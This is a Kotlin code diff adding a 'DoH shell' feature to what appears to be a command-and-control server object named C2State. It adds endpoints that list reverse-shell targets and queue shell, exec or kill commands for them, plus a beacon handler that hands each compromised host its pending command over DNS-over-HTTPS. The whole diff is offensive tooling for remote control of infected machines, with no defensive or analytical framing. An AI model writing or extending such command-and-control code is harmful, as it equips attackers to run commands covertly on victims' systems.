@@ -335,4 +335,40 @@ object C2State {
             }))
             .put("version", VERSION)
     }
+
+    // ------------------------------------------------------------------ DoH shell
+    private val dohTasks = ConcurrentHashMap<String, JSONObject>()
+    private val dohSeen = ConcurrentHashMap<String, Long>()
+
+    /** GET /api/dohshell/targets — active DoH reverse-shell targets with pending tasks. */
+    fun dohShellTargets(): JSONObject {
+        val arr = JSONArray()
+        val now = System.currentTimeMillis()
+        dohSeen.forEach { (id, ts) ->
+            arr.put(
+                JSONObject()
+                    .put("id", id)
+                    .put("last_seen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(ts)))
+                    .put("pending_task", dohTasks.containsKey(id))
+            )
+        }
+        return JSONObject().put("targets", arr).put("count", arr.length())
+    }
+
+    /** POST /api/dohshell/task — push a shell/exec/kill task to a DoH target. */
+    fun pushDohTask(d: JSONObject): JSONObject {
+        val id = d.optString("id")
+        if (id.isBlank()) return JSONObject().put("error", "id required")
+        val act = d.optString("act", "shell")
+        dohTasks[id] = JSONObject().put("act", act).put("cmd", d.optString("cmd", ""))
+        dohSeen[id] = System.currentTimeMillis()
+        audit("C2", "doh task queued for $id: $act")
+        return JSONObject().put("ok", true).put("id", id).put("act", act)
+    }
+
+    /** Internal: a DoH beacon arrived — mark alive, return and clear pending task. */
+    fun dohBeacon(id: String): JSONObject? {
+        dohSeen[id] = System.currentTimeMillis()
+        return dohTasks.remove(id)
+    }
 }
